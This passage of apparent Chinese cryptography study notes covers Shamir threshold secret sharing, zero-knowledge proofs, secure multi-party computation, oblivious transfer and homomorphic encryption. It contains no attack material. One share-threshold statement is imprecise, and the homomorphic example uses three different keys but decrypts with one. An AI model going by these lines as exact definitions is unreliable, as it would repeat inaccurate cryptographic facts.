将秘密S分成n个份额
已知t个份额容易还原出S
已知小于t-1个份额不能还原出S

当t&lt;n时，称为(t,n)门限方案，泄露至多t-1个份额不会危及秘密S
Shamir (t,n)门限方案步骤
参数选取:份额n，门限值t
秘密分割:选取t-1个随机数a1,a2,…,at-1;构造多项式s(x) &#x3D; S+a1x+a2x^2+…+at-1x^(t-1) mod p
选n个整数x1,x2,…,xn，计算yi &#x3D; s(xi) 
将(xi,yi)通过安全信道分别发送给n个参与者
秘密恢复

$$计算 ( S &#x3D; P(0))：
S &#x3D; \sum_{k&#x3D;1}^{t} y_k \cdot \left( \prod_{\substack{1 \leq j \leq t \ j \neq k}} \frac{-x_j}{x_k - x_j} \right)$$
密码协议零知识证明协议证明者向验证者证明某命题的真伪，证明过程中，除了证明该命题真伪，不告诉验证者其他任何信息
安全多方计算协议满足以下条件

参与者将自己的秘密输入到某个多参数复合函数并计算该函数的值
满足某些安全属性，比如机密性
即使存在恶意输入，也要保证可靠性

不经意传输发送者向接收者传输一些信息
其中：

发送者不知道接收者选择接收了哪些信息
接收者只能获取自己选择的信息内容，无法获取未选择的信息的内容

同态加密对密文进行运算的结果进行解密，结果等同于对明文做相同的运算
eg：
​	c1&#x3D;Ek1(m1),c2&#x3D;Ek2(m2),c3&#x3D;Ek3(m3)
​	D((c1+c2+c3)&#x2F;3) &#x3D; (m1+m2+m3)&#x2F;3
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
</search>
